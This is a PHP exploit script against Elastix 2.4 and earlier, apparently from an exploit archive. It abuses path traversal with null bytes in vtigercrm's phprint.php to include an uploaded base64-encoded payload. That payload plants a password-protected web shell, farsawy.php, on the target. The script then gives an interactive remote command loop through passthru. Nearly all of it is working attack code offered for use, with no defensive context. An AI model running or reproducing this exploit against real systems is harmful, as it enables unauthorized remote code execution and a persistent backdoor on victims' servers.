<?
echo "\n+-------------------------------------------+\n";
echo "|              Elastix <= 2.4               |\n";
echo "|         PHP Code Injection Exploit        |\n";
echo "|                  By i-Hmx                 |\n";
echo "|                sec4ever.com               |\n";
echo "|             n0p1337@gmail.com             |\n";
echo "+-------------------------------------------+\n";
echo "\n| Enter Target [https://ip] # ";
$target=trim(fgets(STDIN));
$inj='<?eval(base64_decode("JGY9Zm9wZW4oJ2ZhcnNhd3kucGhwJywndysnKTskZGF0YT0nPD8gaWYoISRfUE9TVFtwd2RdKXtleGl0KCk7fSBlY2hvICJGYXJpcyBvbiB0aGUgbWljIDpEPGJyPi0tLS0tLS0tLS0tLS0tLS0tIjtAZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFtmYV0pKTtlY2hvICItLS0tLS0tLS0tLS0tLS0tLSI7ID8+Jztmd3JpdGUoJGYsJGRhdGEpO2VjaG8gImRvbmUiOwo="));
?>';
$faf=fopen("fa.txt","w+");
fwrite($faf,$inj);
fclose($faf);
$myf='fa.txt';
$url =
$target."/vtigercrm/phprint.php?action=fa&module=ff&lang_crm=../../modules/Import/ImportStep2.php%00";
// URL
$reffer = "http://1337s.cc/index.php";
$agent = "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.4)
Gecko/20030624 Netscape/7.1 (ax)";
$cookie_file_path = "/";
echo "| Injecting 1st payload\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $agent);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,array("userfile"=>"@".realpath($myf)));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_REFERER, $reffer);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$result = curl_exec($ch);
curl_close($ch);
//echo $result;
echo "| Injecting 2nd payload\n";
function faget($url,$post){
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl, CURLOPT_POSTFIELDS,$post);
curl_setopt($curl, CURLOPT_COOKIEFILE, '/');
curl_setopt($curl, CURLOPT_COOKIEJAR, '/');
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,0);
curl_setopt($curl,CURLOPT_TIMEOUT,20);
curl_setopt($curl, CURLOPT_HEADER, true);
$exec=curl_exec($curl);
curl_close($curl);
return $exec;
}
function kastr($string, $start, $end){
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
}
$me=faget($target."/vtigercrm/phprint.php?action=fa&module=ff&lang_crm=../../cache/import/IMPORT_%00","");
echo "| Testing total payload\n";
$total=faget($target."/vtigercrm/farsawy.php","pwd=1337");
if(!eregi("Faris on the mic :D",$total))
{
die("[+] Exploitation Failed\n");
}
echo "| Sending CMD test package\n";
$cmd=faget($target."/vtigercrm/farsawy.php","pwd=1337&fa=cGFzc3RocnUoJ2VjaG8gZmFyc2F3eScpOw==");
if(!eregi("farsawy",$cmd))
{
echo "   + Cmd couldn't executed but we can evaluate php code\n   + use :
$target//vtigercrm/fa.php\n   Post : fa=base64code\n";
}
echo "| sec4ever shell online ;)\n\n";
$host=str_replace('https://','',$target);
while(1){
echo "i-Hmx@$host# ";
$c=trim(fgets(STDIN));
if($c=='exit'){die("[+] Terminating\n");}
$payload=base64_encode("passthru('$c');");
$fuck=faget($target."/vtigercrm/farsawy.php","pwd=1337&fa=$payload");
$done=kastr($fuck,"-----------------","-----------------");
echo "$done\n";
}
/*
I dont even remember when i exploited this shit!
maybe on 2013?!
whatever , Hope its not sold as 0day in the near future xDD
*/
?>